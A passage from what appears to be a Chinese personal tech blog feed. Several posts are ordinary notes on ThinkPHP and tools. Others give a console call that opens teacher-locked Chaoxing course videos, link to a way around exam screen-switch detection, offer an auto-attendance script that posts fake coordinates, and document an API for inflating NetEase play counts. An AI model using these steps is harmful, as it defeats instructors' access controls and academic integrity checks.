class="hljs-number">0</span>]<br>        msg = <span class="hljs-string">&quot;- 今日签到信息：&quot;</span>+<span class="hljs-built_in">str</span>(msg1)+<span class="hljs-string">&quot;\n- 用户等级：&quot;</span>+<span class="hljs-built_in">str</span>(level)+<span class="hljs-string">&quot;\n- 到期时间：&quot;</span>+<span class="hljs-built_in">str</span>(day)+<span class="hljs-string">&quot;\n- 剩余流量：&quot;</span>+<span class="hljs-built_in">str</span>(rest)<br>        print(msg)<br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-comment"># Server酱推送</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_send</span>(<span class="hljs-params">self, msg</span>):</span><br>        <span class="hljs-keyword">if</span> self.sckey == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span><br>        server_url = <span class="hljs-string">&quot;https://sc.ftqq.com/&quot;</span> + <span class="hljs-built_in">str</span>(self.sckey) + <span class="hljs-string">&quot;.send&quot;</span><br>        data = &#123;<br>                <span class="hljs-string">&#x27;text&#x27;</span>: <span class="hljs-string">&quot;签到完成，点击查看详细信息~&quot;</span>,<br>                <span class="hljs-string">&#x27;desp&#x27;</span>: msg<br>            &#125;<br>        requests.post(server_url, data=data)<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self</span>):</span><br>        msg = self.checkin()<br>        self.server_send(msg)<br><br><span class="hljs-comment"># 云函数入口</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_handler</span>(<span class="hljs-params">event, context</span>):</span><br>    run = SspanelQd()<br>    run.main()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run = SspanelQd()<br>    run.main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP学习笔记 - 01入门</title>
    <link href="/2020/09/53.html"/>
    <url>/2020/09/53.html</url>
    
    <content type="html"><![CDATA[<p>学习要点：<br>1.框架简介<br>2.安装步骤<br>3.其它杂项</p><p>本节课我们来开始进入 ThinkPHP5.1 的学习过程，主动了解下框架的需求、安装步骤 以及一些零碎知识点。</p><h1 id="一．框架简介"><a href="#一．框架简介" class="headerlink" title="一．框架简介"></a>一．框架简介</h1><ol><li>ThinkPHP5.1 是目前框架正式版的最新版本； </li><li>ThinkPHP6.0 目前是预览版（尚未稳定的测试版），正式版后考虑制作； </li><li>TP 框架是免费开源的、轻量级的、简单快速且敏捷的 PHP 框架； </li><li>你可以免费使用 TP 框架，甚至可以将你的项目商用； </li><li>ThinkPHP5.1 要求 PHP 版本是 5.6+以上（目前最新版本是 7.x）； </li><li>我们采用最新 7.x 来运行 TP5.1，而预览版 TP6 需要 7.1+； </li><li>集成环境这里采用 windows 结合 wamp，其它系统或环境满足版本要求即可; </li><li>除了 PHP5.6+，还需要开启 PDO 数据库引擎和 MBstring 字符串扩展；</li></ol><h1 id="二．安装步骤"><a href="#二．安装步骤" class="headerlink" title="二．安装步骤"></a>二．安装步骤</h1><ol><li>官网不提供软件包下载，采用 <code>Composer</code> 和 <code>git</code> 方式下载和更新； </li><li>这里只演示 windows 安装，Mac 和 Linux 方法参考一下手册； </li><li>打开 windows 下的运行：cmd，然后运行如下代码（Mac 和 Linux 控制台）：<br><code>composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></li><li>如果上述地址产生阻碍，可以使用国内的：<br><code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></li><li>现在，先启用服务器环境，测试本地 Web 环境是否正常； </li><li>如果你是首次安装 ThinkPHP5.1，那么先从 cmd 中切换到你要加载的目录；<br><code>composer create-project topthink/think=5.1.* tp5.1test</code></li><li>通过访问 <a href="http://localhost/tp5.1test/public">http://localhost/tp5.1test/public</a> 测试是否进入首页； </li><li>如果要更新你的项目版本，直接进入项目根目录，然后直接如下代码：<br><code>composer update topthink/framework</code></li></ol><h1 id="三．其它杂项"><a href="#三．其它杂项" class="headerlink" title="三．其它杂项"></a>三．其它杂项</h1><ol><li>开发规范遵循 PSR-2 命名规范、PSR-4 自动加载； </li><li>目录结构，可以参考手册，课程中会慢慢熟知，不摘入了； </li><li>对于框架的配置，在以后课程中，遇到某个讲解某个； </li><li>学习条件：必须具有 PHP 基础，面向对象基础和 MVC 设计模式基础；</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ThinkPHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>支付宝当面付配置对接代刷网发卡网易支付</title>
    <link href="/2020/08/52.html"/>
    <url>/2020/08/52.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>支付宝当面付不需要挂机，监控，顾客可以用花呗信用卡，不用输入金额直接支付然后直接到账你支付宝余额，很方便。</p></blockquote><ul><li>首先申请当面付地址：<a href="https://b.alipay.com/signing/productSetV2.htm">https://b.alipay.com/signing/productSetV2.htm</a><br>对接代刷网易支付那些基本上都需要 <code>应用ID</code> <code>支付宝公钥</code> <code>商户私钥</code>  这三个</li></ul><p>打开地址： <a href="https://openhome.alipay.com/platform/keyManage.htm">https://openhome.alipay.com/platform/keyManage.htm</a>  登陆一下 ，可以看到如图所示，里面就有 <code>应用ID</code>  已经标注出来了，<br><img src="https://wx2.sbimg.cn/2020/08/15/3oZ51.png" srcset="/img/loading.gif" lazyload alt="3oZ51.png"></p><p>点击接口加签方式旁边那个设置，然后验证一下手机号或者支付密码都可以，这个先放着，然后需要下载一个<a href="https://ideservice.alipay.com/ide/getPluginUrl.htm?clientType=assistant&platform=win&channelType=WEB">支付宝密钥生成器</a> ,下载好了之后安装一下</p><p>打开后直接点生成密钥，然后复制软件里面的应用公钥到刚刚网站打开那个加签管理的公钥里面，然后保存设置等待自动刷新<br><img src="https://s1.ax1x.com/2020/08/15/dkP639.png" srcset="/img/loading.gif" lazyload alt="dkP639.png"><br><img src="https://s1.ax1x.com/2020/08/15/dkie5F.png" srcset="/img/loading.gif" lazyload alt="dkie5F.png"><br><img src="https://s1.ax1x.com/2020/08/15/dkiMvR.png" srcset="/img/loading.gif" lazyload alt="dkiMvR.png"></p><p>商户私钥就是那个软件里面的应用私钥，支付宝公钥等刷新完成后在打开接口加签方式旁边那个设置/查看，上面那个就是支付宝公钥了<br><img src="https://s1.ax1x.com/2020/08/15/dkioZV.png" srcset="/img/loading.gif" lazyload alt="dkioZV.png"><br><img src="https://s1.ax1x.com/2020/08/15/dkiqG4.png" srcset="/img/loading.gif" lazyload alt="dkiqG4.png"></p><p>现在 <code>应用ID</code> <code>支付宝公钥</code> <code>商户私钥</code>  都有了直接填入网站中即可，我这里放一个代刷的图片<br><img src="https://s1.ax1x.com/2020/08/15/dkiOz9.png" srcset="/img/loading.gif" lazyload alt="dkiOz9.png"></p><p><strong>原文链接<a href="https://www.ntaaa.cn/492.html">https://www.ntaaa.cn/492.html</a></strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ulistenhelper - 基于腾讯云语音识别的U校园听力识别工具</title>
    <link href="/2020/07/51.html"/>
    <url>/2020/07/51.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>自己闲的无聊，连夜把这个工具重构了，这回个人感觉还是可以的。<br>实现原理很简单，利用腾讯语音识对听力音频进行处理<br>直接输入听力音频的网址，便可以获得听力的文本内容</p></blockquote><p>个人感觉识别度很高，因为自己也要用，所以做出来分享给大家</p><p>注意：32位操作系统可能用不了，请使用64位操作系统</p><p>源码就不放了，没有注释，命名也不规范。<br>工具下载链接：<a href="https://gocos.lanzous.com/iiXQ5eq802f">https://gocos.lanzous.com/iiXQ5eq802f</a></p><p>参数获取以及详细文档 -&gt; <a href="https://www.52pojie.cn/thread-1221679-1-1.html">https://www.52pojie.cn/thread-1221679-1-1.html</a></p><p>听力音频链接获取 -&gt; <a href="https://gocos.cn/2020/04/34.html">https://gocos.cn/2020/04/34.html</a></p><p>程序截图：<br><img src="https://ftp.bmp.ovh/imgs/2020/07/03b7fc4ddcdcabec.png" srcset="/img/loading.gif" lazyload alt="1"><br><img src="https://ftp.bmp.ovh/imgs/2020/07/1c15b807d76c5ba8.png" srcset="/img/loading.gif" lazyload alt="2"><br><img src="https://ftp.bmp.ovh/imgs/2020/07/ad1781e16ee9bf01.png" srcset="/img/loading.gif" lazyload alt="3"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网易云音乐升级API</title>
    <link href="/2020/07/50.html"/>
    <url>/2020/07/50.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>接口网站<a href="http://netease.gocos.cn/">http://netease.gocos.cn</a><br>在线使用<a href="http://netease.gocos.cn/music">http://netease.gocos.cn/music</a></p></blockquote><h1 id="接口文档"><a href="#接口文档" class="headerlink" title="接口文档"></a>接口文档</h1><ul><li>调用前须知<br>本项目不提供线上 demo，请不要轻易信任使用他人提供的公开服务，如果使用，填写密码时一定要自己加密MD5，以免发生安全问题，泄露自己的账号和密码。<br>为使用方便,降低门槛, 文档示例接口直接使用了 GET 请求,本项目同时支持 GET/POST 请按实际需求使用<br>本项目仅供学习使用,请尊重版权，请勿利用此项目从事商业行为<br>API登陆接口只接收MD5加密后的密码，并且不会储存你的个人信息，原密码除了你自己谁也不知道<br>使用本项目不会影响你的听歌风格，刷的歌都来自你的每日推荐歌单。</li></ul><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>说明 : 登录有两个接口,建议使用encodeURIComponent对密码编码或者使用POST请求,避免某些特殊字符无法解析,如#(#在url中会被识别为hash,而不是query)<br>无论是手机登录还是邮箱登陆，密码都必须使用MD5，不可以直接传入明文<br>明文例如：123456abcd<br>MD5例如：efa224f8de55cb668cd01edbccdfc8a9</p><ol><li>手机登录<br>必选参数 :<br>uin: 手机号码<br>pwd: 密码<br>接口地址 : /?do=login<br>可选参数 : r: 0至1的随机数，例如0.20246864764818318<br>调用例子 : /?do=login&amp;uin=xxx&amp;pwd=yyy</li><li>邮箱登录<br>必选参数 :<br>uin: 163 网易邮箱<br>pwd: 密码<br>接口地址 : /?do=email<br>调用例子 : /?do=email&amp;uin=xxx&amp;pwd=yyy<br>完成登录后 , 会在浏览器保存一个 Cookies 用作登录凭证 , 大部分 API 都需要用到这个 Cookies,请求会自动带上 Cookies</li></ol><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>说明：调用接口这个接口可以签到<br>接口地址 : /?do=sign</p><h1 id="打卡听歌"><a href="#打卡听歌" class="headerlink" title="打卡听歌"></a>打卡听歌</h1><p>说明：由于网易云官方问题，如果打卡听歌只刷了一部分，可以多请求几次，建议每次间隔30秒请求3次左右<br>接口地址 : /?do=daka</p><h1 id="获取用户详情"><a href="#获取用户详情" class="headerlink" title="获取用户详情"></a>获取用户详情</h1><p>说明 : 登陆后调用此接口 , 传入用户 id, 可以获取用户详情<br>必选参数 :<br>uid : 用户 id<br>接口地址 : /?do=detail<br>调用例子 : /?do=detail&amp;uid=32953014<br>注意获取用户信息接口传入的时uid，而登陆接口传入的是uin，不要搞混淆</p><h1 id="检查接口"><a href="#检查接口" class="headerlink" title="检查接口"></a>检查接口</h1><p>说明：调用此接口可检查当前项目API是否可用，建议在调用接口前先调用此接口做个判断<br>接口地址 : /?do=check</p><h1 id="刷单曲播放次数"><a href="#刷单曲播放次数" class="headerlink" title="刷单曲播放次数"></a>刷单曲播放次数</h1><p>说明 : 登陆后调用此接口 , 传入指定歌单id和次数, 可以使该歌单内每首单曲各增加一定的播放次数<br>必选参数 :<br>id : 歌单 id<br>time : 歌单播放次数<br>接口地址 : /?do=listen<br>调用例子 : /?do=listen&amp;id=5101628912&amp;time=300</p><p>说明：应用场景常用于定向性训练账号的听歌趋向，可自主纠正系统的个性化推送，让它推送你真正喜欢的内容。这里的次数是指歌单播放次数，比如歌单内有两首歌，次数定为300，则两首歌各增加300次播放次数，如果只想提高某一首歌的次数，那就让这个歌单只留下这一首即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超星学习通上锁视频进入原理与实现</title>
    <link href="/2020/07/49.html"/>
    <url>/2020/07/49.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>相信大家都应该知道，这个学期的线上学习成绩占的比重很大吧，我们差不多占到了50%左右，这是什么概念？这就意味着返校考试划划水就可以过了。那这个线上学习的成绩大部分来自于学习通中视频的观看，鉴于学习通（du）经常性的抽风，导致我们进不去，再加上老师过了一段时间就将视频上锁，我们想学习都学不了（我要分数！我要分数！我要分数！）<br>为了省去找老师费嘴皮子求开视频的麻烦，我果断自己动手了，这篇文章就来告诉大家如何解决这个问题，成功看完视频拿到视频平时分。</p></blockquote><a id="more"></a><p>这个教程分两个部分，第一部分-进后台（看自己那个视频没看），第二部分-进入视频（进入上锁视频完成观看）<br><strong>转载请注明原文链接</strong></p><h1 id="如何进入后台"><a href="#如何进入后台" class="headerlink" title="如何进入后台"></a>如何进入后台</h1><p><img src="https://ae01.alicdn.com/kf/Hfad9a10c57a04f498e505be61ef4a814O.jpg" srcset="/img/loading.gif" lazyload alt="1"></p><p>进入后台的链接地址：<br><code>https://mooc1-1.chaoxing.com/moocAnalysis/chapterStatisticByUser?classId=你的classId&amp;courseId=你的courseId&amp;userId=你的userId&amp;ut=s</code><br>注意：大部分后台地址都是这个，如果进不去可以联系我</p><p>ok，现在我们只需要解决这三个参数就可以进入后台了</p><ul><li>获取参数</li></ul><p>1.进入课程，鼠标右键，选择<code>查看网页源代码</code><br><img src="https://ae01.alicdn.com/kf/H519183b14185402683726706f7eef4b3B.jpg" srcset="/img/loading.gif" lazyload alt="2"><br>2.在新弹出来的页面进行查找(快捷键ctrl+F)，查找字段<code>moocId</code>（搜索不到请搜索<code>gv</code>或者直接搜索<code>classId</code>、<code>courseId</code>、<code>userId</code>)<br><img src="https://ae01.alicdn.com/kf/H752205810f2a4063a9cac1d395d57a07r.jpg" srcset="/img/loading.gif" lazyload alt="3"><br><strong>注意看图中的对应信息</strong><br>3.将获取的三个参数填入上述网址，回车进入后台</p><h1 id="如何进入上锁视频"><a href="#如何进入上锁视频" class="headerlink" title="如何进入上锁视频"></a>如何进入上锁视频</h1><p>我们现在已经进入后台了，那么我们就可以看到那些视频是我们看完的，哪些是没有看的。<br><img src="https://ae01.alicdn.com/kf/H47e46556dd714b079765c34011c62847W.jpg" srcset="/img/loading.gif" lazyload alt="4"></p><p>ok,我们已经找到那些视频没看了，返回我们的课程，找一个可以进去的任务点<br><img src="https://ae01.alicdn.com/kf/H5c72327bb36d409faaec17bbde0ea4e7E.jpg" srcset="/img/loading.gif" lazyload alt="5"></p><p>1.在这个页面按F12<br><img src="https://ae01.alicdn.com/kf/Hdc28590ef6a646fa811a9aade4dae841A.jpg" srcset="/img/loading.gif" lazyload alt="6"><br>2.认真看下图<br><img src="https://ae01.alicdn.com/kf/H3f7c614ccd584933aa33a2ce8230e3a95.jpg" srcset="/img/loading.gif" lazyload alt="7"><br>3.认真看下图<br><img src="https://ae01.alicdn.com/kf/Hd2383ad42e12400d8489890292999accH.jpg" srcset="/img/loading.gif" lazyload alt="8"><br>4.在在图中所示位置输入<code>javascript:getTeacherAjax(&#39;你的courseId&#39;,&#39;你的classId&#39;,&#39;上图获得的cur后面的数字&#39;);</code>然后按回车，奇妙的事情发生了<br><img src="https://ae01.alicdn.com/kf/Hf9c186bd32d94c54b1e6f0122b0bdb8aX.jpg" srcset="/img/loading.gif" lazyload alt="9"></p><p>我们已经进入上锁视频了，教程结束</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>经过测试，上锁视频看完后台进度是加的，视频的分数是加的，对于未完成的上锁作业应该是不能提交，具体自己摸索吧</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>超星学习通考试系统功能扫盲</title>
    <link href="/2020/06/48.html"/>
    <url>/2020/06/48.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>超星这个新的考试系统出了好像也有一段时间了，看网上那个的消息听起来很厉害的样子，此生有幸，我们已经用这个考试系统考过了，接下来呢，就和大家说说这个考试系统吧</p></blockquote><p><strong>因为没有教师端账号，以下内容仅供参考</strong></p><h1 id="part1-试卷发布界面"><a href="#part1-试卷发布界面" class="headerlink" title="part1-试卷发布界面"></a>part1-试卷发布界面</h1><p><img src="https://ae01.alicdn.com/kf/H37c193043a934056938194bbb82c188al.jpg" srcset="/img/loading.gif" lazyload alt="1"></p><p>我们可以看到这里有一个防作弊设置，我来逐一解释下</p><ul><li>题目乱序-顾名思义，每个人的题目顺序不一样</li><li>选项乱序-每道题目的选项顺序不同</li><li>考试过程中抓拍监控-这个主要是两个步骤</li><li>考试进入的时候会要求采集你的人脸信息（老版本可能采集不到，后台监考显示未采集到人脸）</li><li>考试过程中会抓拍，前、后摄像头翻转一次为一次抓拍（在监考后台老师可以随时点击抓拍按钮，系统是否会自动抓拍我没有测试）</li><li>考试过程中切屏控制-切屏会有提醒，解决办法见<a href="https://gocos.cn/2020/05/40.html">https://gocos.cn/2020/05/40.html</a></li><li><img src="https://ae01.alicdn.com/kf/H9e1304f595a342088d79c6976943a44ft.jpg" srcset="/img/loading.gif" lazyload alt="2"></li><li>可以限制考试客户端（手机和电脑（注意，电脑是客户端不是网页））</li><li>系统默认考试须知如下：<br><img src="https://ae01.alicdn.com/kf/Hc3dc559f71214bde82224d0d86257c9ez.jpg" srcset="/img/loading.gif" lazyload alt="3"></li></ul><h1 id="part2-监考界面"><a href="#part2-监考界面" class="headerlink" title="part2-监考界面"></a>part2-监考界面</h1><ul><li>在线监考<br><img src="https://ae01.alicdn.com/kf/H918e83f7cb194680996d38c72c65cf4aF.jpg" srcset="/img/loading.gif" lazyload alt="4"><br><img src="https://ae01.alicdn.com/kf/Hdde452ae80954e13a5c939983f6d2e30p.jpg" srcset="/img/loading.gif" lazyload alt="5"></li><li>监考界面<br><img src="https://ae01.alicdn.com/kf/H834700a1f1144e13b5f32a207985474dG.jpg" srcset="/img/loading.gif" lazyload alt="6"></li><li>教师可在此监考（主要功能：发送警告、强制收卷），亦可以点击查看考生详细信息（包括：考试客户端类型、人脸采集信息、抓拍图像、切屏次数和每次切屏持续的时间、每道题目提交的时间点）</li></ul><p>大概就这些，祝大家考试顺利。</p>]]></content>
    
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用python实现超星学习通自动签到</title>
    <link href="/2020/06/47.html"/>
    <url>/2020/06/47.html</url>
    
    <content type="html"><![CDATA[<h1 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h1><ul><li>requests</li><li>pillow</li><li>lxml</li></ul><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>1.测试环境为python3.7+,自行安装python3<br>2.安装所需第三方模块，依次执行<code>pip install requests</code>、<code>pip install pillow</code>、<code>pip install lxml</code><br>3.Python 和需要模块都装好了直接在目录 cmd 运行所需脚本。</p><h1 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h1> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,time,json,re,base64<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br>requests.packages.urllib3.disable_warnings()<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image,ImageDraw,ImageChops<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, parse_qs<br><br>username = <span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment">#登录账号</span><br>password = <span class="hljs-string">&quot;&quot;</span>   <span class="hljs-comment">#登录密码</span><br>sckey = <span class="hljs-string">&quot;&quot;</span>      <span class="hljs-comment">#Server酱推送提醒key</span><br><br>s = requests.Session()<br>s.headers.update(&#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36&#x27;</span>&#125;)<br>activates = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign</span>(<span class="hljs-params">aid, uid</span>):</span><br>    <span class="hljs-keyword">global</span> activates<br>    url = <span class="hljs-string">&quot;https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId=&quot;</span> + aid + <span class="hljs-string">&quot;&amp;uid=&quot;</span> + uid + <span class="hljs-string">&quot;&amp;clientip=&amp;latitude=-1&amp;longitude=-1&amp;appType=15&amp;fid=0&quot;</span><br>    res = s.get(url,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> (res.text == <span class="hljs-string">&quot;success&quot;</span>):<br>        print(<span class="hljs-string">&quot; 签到成功！&quot;</span>)<br>        <span class="hljs-keyword">if</span> sckey != <span class="hljs-string">&quot;&quot;</span>:<br>            data = &#123;<br>                <span class="hljs-string">&quot;text&quot;</span> : <span class="hljs-string">&quot;签到成功&quot;</span>,<br>                <span class="hljs-string">&quot;desp&quot;</span> : <span class="hljs-string">&quot;aid&quot;</span> + <span class="hljs-built_in">str</span>(aid)<br>                &#125;<br>            sckeyurl = <span class="hljs-string">&quot;http://sc.ftqq.com/&quot;</span>+<span class="hljs-built_in">str</span>(sckey)+<span class="hljs-string">&quot;.send&quot;</span><br>            web = s.post(sckeyurl, data=data, verify=<span class="hljs-literal">False</span>)<br>        activates.append(aid)<br>    <span class="hljs-keyword">elif</span>(res.text == <span class="hljs-string">&quot;您已签到过了&quot;</span>):<br>        print(res.text)<br>        activates.append(aid)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> sckey != <span class="hljs-string">&quot;&quot;</span>:<br>            data = &#123;<br>                <span class="hljs-string">&quot;text&quot;</span> : <span class="hljs-string">&quot;签到失败&quot;</span>,<br>                <span class="hljs-string">&quot;desp&quot;</span> : <span class="hljs-string">&quot;aid&quot;</span> + <span class="hljs-built_in">str</span>(aid)<br>                &#125;<br>            sckeyurl = <span class="hljs-string">&quot;http://sc.ftqq.com/&quot;</span>+<span class="hljs-built_in">str</span>(sckey)+<span class="hljs-string">&quot;.send&quot;</span><br>            web = s.post(sckeyurl, data=data, verify=<span class="hljs-literal">False</span>)<br>        print(<span class="hljs-string">&quot;签到失败&quot;</span>)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">global</span> uid,username,password<br>    <span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">or</span> password == <span class="hljs-string">&quot;&quot;</span>):<br>        username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;登录账号：&quot;</span>)<br>        password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;登录密码：&quot;</span>)<br>    <span class="hljs-comment">#旧接口，已失效</span><br>    <span class="hljs-comment">#url=&quot;http://i.chaoxing.com/vlogin?passWord=&quot;+str(password)+&quot;&amp;userName=&quot;+str(username)</span><br>    url = <span class="hljs-string">f&#x27;https://passport2-api.chaoxing.com/v11/loginregister?uname=&#x27;</span>+<span class="hljs-built_in">str</span>(username)+<span class="hljs-string">&#x27;&amp;code=&#x27;</span>+<span class="hljs-built_in">str</span>(password)<br>    res= s.get(url)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;验证通过&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(res.text)):<br>        print(<span class="hljs-string">&#x27;Login success!&#x27;</span>)<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> res.cookies.items():<br>            <span class="hljs-keyword">if</span> key==<span class="hljs-string">&quot;_uid&quot;</span>:<br>                uid=value<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        print(username,password)<br>        print(<span class="hljs-string">&#x27;账号密码有误，请重试。&#x27;</span>)<br>        username = <span class="hljs-string">&quot;&quot;</span><br>        password = <span class="hljs-string">&quot;&quot;</span><br>        login()<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getuserdata</span>():</span><br>    web = s.get(<span class="hljs-string">&#x27;http://mooc1-1.chaoxing.com/visit/courses&#x27;</span>)<br>    h1 = etree.HTML(web.text)<br>    name = h1.xpath(<span class="hljs-string">&#x27;//h3[@class = &quot;clearfix&quot;]/a/text()&#x27;</span>)<br>    print(<span class="hljs-string">&quot;-----------课程名称-----------&quot;</span>)<br>    print(name)<br>    print(<span class="hljs-string">&quot;------------------------------&quot;</span>)<br>    <span class="hljs-keyword">global</span> count<br>    <span class="hljs-keyword">try</span>:<br>        count<br>    <span class="hljs-keyword">except</span> NameError:<br>        count_exist = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        count_exist = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span>(count_exist):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(name) == <span class="hljs-number">1</span>):<br>            count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment">#count = 0</span><br>            count = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请用数字选择要签到的课程(从0开始)：&quot;</span>))<br>    geturl = h1.xpath(<span class="hljs-string">&#x27;//div[@class = &quot;Mcon1img httpsClass&quot;]/a/@href&#x27;</span>)<br>    i = <span class="hljs-number">0</span><br>    courseurl = []<br>    <span class="hljs-keyword">for</span> temp <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(geturl)):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;/mycourse/studentcourse&quot;</span> <span class="hljs-keyword">in</span> geturl[i]):<br>            courseurl.append(geturl[i])<br>        i += <span class="hljs-number">1</span><br>    url = <span class="hljs-string">&#x27;https://mooc1-1.chaoxing.com&#x27;</span> + courseurl[count]<br>    url_query = urlparse(url).query<br>    userdata = <span class="hljs-built_in">dict</span>([(k, v[<span 